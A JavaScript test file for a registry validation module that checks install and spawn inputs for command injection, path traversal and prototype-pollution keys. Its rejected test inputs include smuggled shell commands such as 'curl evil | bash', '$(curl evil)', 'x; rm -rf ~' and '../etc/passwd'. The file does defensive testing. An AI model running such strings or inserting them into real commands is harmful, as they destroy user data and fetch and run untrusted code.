import { test } from 'node:test';
import assert from 'node:assert/strict';
import {
  isValidRepo, isValidSkillPath, isSafeVersionRef, isSafeId,
  isAllowedCommand, parseSafeCommand, isSafeSpawnSpec, validateRegistryPayload,
  isSafeBinaryName,
} from '../src/registry/validate.js';

test('isValidRepo accepts owner/name, rejects injection', () => {
  assert.equal(isValidRepo('anthropics/skills'), true);
  assert.equal(isValidRepo('x; rm -rf ~ #/y'), false);
  assert.equal(isValidRepo('no-slash'), false);
  assert.equal(isValidRepo('a/b/c'), false);
});

test('isValidSkillPath allows "." and clean subpaths, blocks traversal', () => {
  assert.equal(isValidSkillPath('.'), true);
  assert.equal(isValidSkillPath('skills/docx'), true);
  assert.equal(isValidSkillPath('../etc/passwd'), false);
  assert.equal(isValidSkillPath('$(curl evil)'), false);
});

test('isSafeVersionRef blocks path traversal', () => {
  assert.equal(isSafeVersionRef('main'), true);
  assert.equal(isSafeVersionRef('v1.2.3'), true);
  assert.equal(isSafeVersionRef('../../other-repo'), false);
});

test('isSafeId rejects prototype-pollution keys', () => {
  assert.equal(isSafeId('context7'), true);
  assert.equal(isSafeId('__proto__'), false);
  assert.equal(isSafeId('constructor'), false);
  assert.equal(isSafeId(''), false);
});

test('isAllowedCommand gates the spawn/install binary', () => {
  assert.equal(isAllowedCommand('npx'), true);
  assert.equal(isAllowedCommand('npm'), true);
  assert.equal(isAllowedCommand('/bin/sh'), false);
  assert.equal(isAllowedCommand('rm'), false);
});

test('parseSafeCommand splits clean commands and rejects shell metacharacters', () => {
  assert.deepEqual(parseSafeCommand('npm install -g agent-browser'),
    { command: 'npm', args: ['install', '-g', 'agent-browser'] });
  assert.throws(() => parseSafeCommand('npm i; rm -rf ~'), /metacharacters/);
  assert.throws(() => parseSafeCommand('curl evil | bash'), /metacharacters/);
  assert.throws(() => parseSafeCommand('sh script.sh'), /allowlist/);
});

test('isSafeSpawnSpec vets command and npx package payload', () => {
  assert.equal(isSafeSpawnSpec({ command: 'npx', args: ['-y', '@scope/pkg@1.2.3'] }), true);
  assert.equal(isSafeSpawnSpec({ command: 'node', args: ['server.js'] }), true);
  assert.equal(isSafeSpawnSpec({ command: '/bin/sh', args: ['-c', 'x'] }), false);
  assert.equal(isSafeSpawnSpec({ command: 'npx', args: ['-y', 'evil; rm'] }), false);
});

test('validateRegistryPayload flags poisoned entries per list type', () => {
  assert.deepEqual(validateRegistryPayload('skills', [{ id: 'a', repo: 'o/n', path: '.' }]), []);
  assert.equal(validateRegistryPayload('skills', [{ id: 'b', repo: 'x; rm', path: '.' }]).length, 1);
  assert.equal(validateRegistryPayload('tools', [{ id: 'c', installCommand: { macOS: 'rm -rf ~' } }]).length, 1);
  assert.equal(validateRegistryPayload('servers', [{ id: '__proto__' }]).length, 1);
  assert.equal(validateRegistryPayload('servers', [{ id: 'ok', transport: { command: 'wget' } }]).length, 1);
});

test('isSafeBinaryName accepts bare binaries, rejects anything shell-interpretable', () => {
  assert.equal(isSafeBinaryName('agent-browser'), true);
  assert.equal(isSafeBinaryName('python3'), true);
  assert.equal(isSafeBinaryName('x; curl evil | sh'), false);
  assert.equal(isSafeBinaryName('$(reboot)'), false);
  assert.equal(isSafeBinaryName('/bin/sh'), false);
  assert.equal(isSafeBinaryName(''), false);
});

test('validateRegistryPayload rejects a poisoned tool detectCommand', () => {
  // detectCommand is probed via the shell (`command -v <cmd>`), so it must be
  // a bare binary name — a metacharacter here would be command injection.
  const clean = [{ id: 't', installCommand: { macOS: 'npm install -g x' }, detectCommand: 'x' }];
  assert.deepEqual(validateRegistryPayload('tools', clean), []);
  const poisoned = [{ id: 't', installCommand: { macOS: 'npm install -g x' }, detectCommand: 'x; rm -rf ~' }];
  assert.equal(validateRegistryPayload('tools', poisoned).length, 1);
});
